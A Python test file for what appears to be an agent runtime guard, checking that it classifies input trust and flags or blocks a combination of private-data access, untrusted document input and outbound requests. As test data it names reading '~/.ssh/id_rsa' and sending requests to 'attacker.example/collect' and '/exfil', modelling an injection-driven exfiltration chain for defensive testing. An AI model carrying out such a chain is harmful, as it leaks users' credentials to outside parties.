"""Phase 3 runtime control tests: input classification + CEC."""

from __future__ import annotations

import os
import sys
import uuid
from pathlib import Path

sys.path.insert(0, os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "src"))

from clawzero.contracts import ActionRequest, InputClass
from clawzero.runtime import MVARRuntime


def _runtime(
    tmp_path: Path,
    profile: str = "dev_balanced",
    *,
    cec_enforce: bool = False,
) -> MVARRuntime:
    witness_dir = tmp_path / f"witness_{uuid.uuid4().hex}"
    witness_dir.mkdir(parents=True, exist_ok=True)
    rt = MVARRuntime(profile=profile, witness_dir=witness_dir, cec_enforce=cec_enforce)
    rt._mvar_available = False
    rt._mvar_governor = None
    rt.engine = "embedded-policy-v0.1"
    rt.policy_id = "mvar-embedded.v0.1"
    return rt


def _request(
    *,
    sink_type: str,
    target: str,
    source: str,
    taint_level: str,
    input_class: InputClass,
    policy_profile: str = "dev_balanced",
) -> ActionRequest:
    return ActionRequest(
        request_id=str(uuid.uuid4()),
        framework="openclaw",
        action_type="tool_call",
        sink_type=sink_type,
        tool_name="phase3_tool",
        target=target,
        arguments={"target": target},
        input_class=input_class.value,
        prompt_provenance={
            "source": source,
            "taint_level": taint_level,
            "source_chain": [source, "tool_call"],
            "taint_markers": []
            if input_class in {InputClass.TRUSTED, InputClass.PRE_AUTHORIZED}
            else ["external_input"],
        },
        policy_profile=policy_profile,
        metadata={
            "adapter": {
                "name": "openclaw",
                "mode": "event_intercept",
                "framework": "openclaw",
            }
        },
    )


def test_cec_triggered_all_three_legs(tmp_path: Path):
    rt = _runtime(tmp_path, profile="dev_balanced", cec_enforce=False)

    rt.evaluate(
        _request(
            sink_type="credentials.access",
            target="~/.ssh/id_rsa",
            source="user_request",
            taint_level="trusted",
            input_class=InputClass.TRUSTED,
        )
    )
    rt.evaluate(
        _request(
            sink_type="tool.custom",
            target="summarize",
            source="external_document",
            taint_level="untrusted",
            input_class=InputClass.UNTRUSTED,
        )
    )
    rt.evaluate(
        _request(
            sink_type="http.request",
            target="https://attacker.example/collect",
            source="external_document",
            taint_level="untrusted",
            input_class=InputClass.UNTRUSTED,
        )
    )

    witness = rt.last_witness
    cec = witness["cec_status"]
    assert cec["has_private_data"] is True
    assert cec["has_untrusted_input"] is True
    assert cec["has_exfil_capability"] is True
    assert cec["cec_triggered"] is True


def test_cec_warn_adds_to_witness(tmp_path: Path):
    rt = _runtime(tmp_path, profile="dev_balanced", cec_enforce=False)
    rt.evaluate(
        _request(
            sink_type="tool.custom",
            target="hello",
            source="user_request",
            taint_level="trusted",
            input_class=InputClass.TRUSTED,
        )
    )

    witness = rt.last_witness
    assert "cec_status" in witness
    assert witness["cec_status"]["cec_triggered"] is False


def test_cec_enforce_escalates_profile(tmp_path: Path):
    rt = _runtime(tmp_path, profile="dev_balanced", cec_enforce=True)

    rt.evaluate(
        _request(
            sink_type="credentials.access",
            target="~/.ssh/id_rsa",
            source="user_request",
            taint_level="trusted",
            input_class=InputClass.TRUSTED,
        )
    )
    rt.evaluate(
        _request(
            sink_type="tool.custom",
            target="summarize",
            source="external_document",
            taint_level="untrusted",
            input_class=InputClass.UNTRUSTED,
        )
    )
    decision = rt.evaluate(
        _request(
            sink_type="http.request",
            target="https://attacker.example/exfil",
            source="user_request",
            taint_level="trusted",
            input_class=InputClass.TRUSTED,
        )
    )

    assert decision.decision == "block"
    assert decision.policy_profile == "prod_locked"
    assert decision.annotations["cec_escalated_profile"] == "prod_locked"
    assert rt.last_witness["cec_status"]["cec_triggered"] is True


def test_input_class_trusted_relaxes(tmp_path: Path):
    rt = _runtime(tmp_path, profile="dev_strict", cec_enforce=False)
    decision = rt.evaluate(
        _request(
            sink_type="tool.custom",
            target="summarize",
            source="user_request",
            taint_level="trusted",
            input_class=InputClass.TRUSTED,
            policy_profile="dev_strict",
        )
    )
    assert decision.decision == "allow"


def test_input_class_untrusted_maximum(tmp_path: Path):
    rt = _runtime(tmp_path, profile="dev_balanced", cec_enforce=False)
    decision = rt.evaluate(
        _request(
            sink_type="tool.custom",
            target="summarize",
            source="external_document",
            taint_level="untrusted",
            input_class=InputClass.UNTRUSTED,
            policy_profile="dev_balanced",
        )
    )
    assert decision.decision == "annotate"
    assert decision.annotations["enforcement_action"] == "block_until_approved"
    assert rt.last_witness["input_class"] == "untrusted"

